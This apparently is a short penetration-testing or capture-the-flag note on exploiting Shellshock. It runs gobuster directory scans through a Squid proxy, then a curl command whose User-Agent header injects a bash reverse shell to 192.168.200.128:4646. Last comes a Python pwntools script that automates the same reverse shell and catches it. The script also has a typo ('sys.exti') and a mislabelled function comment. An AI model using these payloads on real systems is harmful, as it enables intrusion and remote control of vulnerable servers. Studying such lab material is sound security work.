# Shell Shock
- Do a *brute force* reconnaissance with **gobuster** to possibly find out the **cgi-bin** directory.
	```shell
	gobuster dir -u http://192.168.200.134/ --proxy http://192.168.200.134:3128 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 --add-slash
	 gobuster dir -u http://192.168.200.134/cgi-bin/ --proxy http://192.168.200.134:3128 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x ph,sh,cgi 
	```
- Reference to [Shell-Shock](https://blog.cloudflare.com/inside-shellshock/).
- You should probe.
	```shell
	curl -s http://127.0.0.1/cgi-bin/status --proxy http://192.168.200.134:3128 -H "User-Agent: () { :; }; echo; echo; /bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.200.128/4646 0>&1'"
	```
- Use this automate **Python** script.
	```python
	#!/usr/bin/python3
	
	import sys
	import signal
	import requests
	from pwn import *
	import threading
	
	# function to manage CTRL+c
	def def_handler(sig, frame):
	    print("\n[!] Exiting...\n")
	    sys.exti(1)
	
	# function to find out every port behind a Proxy
	def shellShock():
	    headers = {"User-Agent": "() { :; }; /bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.200.128/4646 0>&1'"}
	    r = requests.get(main_url, proxies=squid_proxy, headers=headers)
	
	# CTRL+c
	signal.signal(signal.SIGINT, def_handler)
	
	# global variables
	main_url = "http://127.0.0.1/cgi-bin/status"
	squid_proxy = {"http": "http://192.168.200.134:3128"}
	d_port = 4646
	
	if __name__ == "__main__":
	    try:
	        threading.Thread(target=shellShock, args=()).start()
	    except Exception as e:
	        log.error(str(e))
	
	    shell = listen(d_port, timeout=20).wait_for_connection()
	    if shell.sock is None:
	        log.failure("Connection failure")
	        sys.exit(1)
	    else:
	        shell.interactive()
	```